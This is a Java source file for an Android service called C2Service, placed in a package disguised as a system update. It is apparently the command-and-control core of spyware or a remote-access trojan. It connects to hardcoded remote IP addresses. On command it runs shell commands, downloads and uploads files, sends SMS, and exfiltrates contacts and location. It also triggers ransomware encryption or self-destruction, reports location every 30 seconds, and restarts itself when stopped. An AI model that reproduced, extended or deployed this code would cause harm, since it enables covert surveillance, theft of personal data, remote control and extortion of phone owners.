package com.android.system.update.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.android.system.update.BuildConfig;
import com.android.system.update.utils.CryptoUtils;
import com.android.system.update.utils.FileUtils;
import com.android.system.update.utils.SMSUtils;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;

import java.net.URI;
import java.util.Timer;
import java.util.TimerTask;

public class C2Service extends Service {
    
    private WebSocketClient webSocketClient;
    private Timer heartbeatTimer;
    private static final String TAG = "C2Service";
    private String[] c2Servers = {
        BuildConfig.C2_SERVER,
        BuildConfig.C2_FALLBACK,
        "ws://45.155.205.33:4444",
        "ws://103.172.191.1:8080"
    };
    private int currentServerIndex = 0;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        connectToC2();
        startHeartbeat();
        return START_STICKY;
    }
    
    private void connectToC2() {
        try {
            URI uri = new URI(c2Servers[currentServerIndex]);
            webSocketClient = new WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    Log.d(TAG, "Connected to C2");
                    
                    // Send device info on connect
                    JSONObject deviceInfo = DeviceInfoUtils.getDeviceInfo(getApplicationContext());
                    send(deviceInfo.toString());
                }
                
                @Override
                public void onMessage(String message) {
                    Log.d(TAG, "Command received: " + message);
                    executeCommand(message);
                }
                
                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.d(TAG, "Disconnected from C2");
                    // Try next server
                    currentServerIndex = (currentServerIndex + 1) % c2Servers.length;
                    new android.os.Handler().postDelayed(() -> connectToC2(), 5000);
                }
                
                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "C2 Error", ex);
                }
            };
            
            webSocketClient.connect();
            
        } catch (Exception e) {
            Log.e(TAG, "Connection error", e);
        }
    }
    
    private void executeCommand(String command) {
        try {
            JSONObject cmd = new JSONObject(command);
            String action = cmd.getString("action");
            
            switch (action) {
                case "EXEC":
                    String shellCommand = cmd.getString("command");
                    String result = ShellUtils.execute(shellCommand);
                    webSocketClient.send(new JSONObject()
                        .put("type", "result")
                        .put("data", result).toString());
                    break;
                    
                case "DOWNLOAD":
                    String url = cmd.getString("url");
                    String path = cmd.getString("path");
                    FileUtils.downloadFile(url, path);
                    break;
                    
                case "UPLOAD":
                    String filePath = cmd.getString("file");
                    String content = FileUtils.readFile(filePath);
                    webSocketClient.send(new JSONObject()
                        .put("type", "file")
                        .put("name", filePath)
                        .put("content", content).toString());
                    break;
                    
                case "SMS":
                    String phone = cmd.getString("phone");
                    String message = cmd.getString("message");
                    SMSUtils.sendSMS(getApplicationContext(), phone, message);
                    break;
                    
                case "LOCATION":
                    JSONObject loc = LocationUtils.getLocation(getApplicationContext());
                    webSocketClient.send(new JSONObject()
                        .put("type", "location")
                        .put("data", loc).toString());
                    break;
                    
                case "CONTACTS":
                    JSONObject contacts = ContactsUtils.getContacts(getApplicationContext());
                    webSocketClient.send(new JSONObject()
                        .put("type", "contacts")
                        .put("data", contacts).toString());
                    break;
                    
                case "SELF_DESTRUCT":
                    SelfDestructUtils.destroy(getApplicationContext());
                    break;
                    
                case "RANSOMWARE":
                    String wallet = cmd.getString("wallet");
                    RansomwareUtils.encryptFiles(getApplicationContext(), wallet);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution error", e);
        }
    }
    
    private void startHeartbeat() {
        heartbeatTimer = new Timer();
        heartbeatTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (webSocketClient != null && webSocketClient.isOpen()) {
                    JSONObject heartbeat = new JSONObject();
                    try {
                        heartbeat.put("type", "heartbeat");
                        heartbeat.put("battery", BatteryUtils.getLevel(getApplicationContext()));
                        heartbeat.put("location", LocationUtils.getLastKnownLocation(getApplicationContext()));
                        webSocketClient.send(heartbeat.toString());
                    } catch (Exception e) {
                        Log.e(TAG, "Heartbeat error", e);
                    }
                }
            }
        }, 0, 30000); // Every 30 seconds
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocketClient != null) {
            webSocketClient.close();
        }
        if (heartbeatTimer != null) {
            heartbeatTimer.cancel();
        }
        
        // Restart service
        startService(new Intent(this, C2Service.class));
    }
} 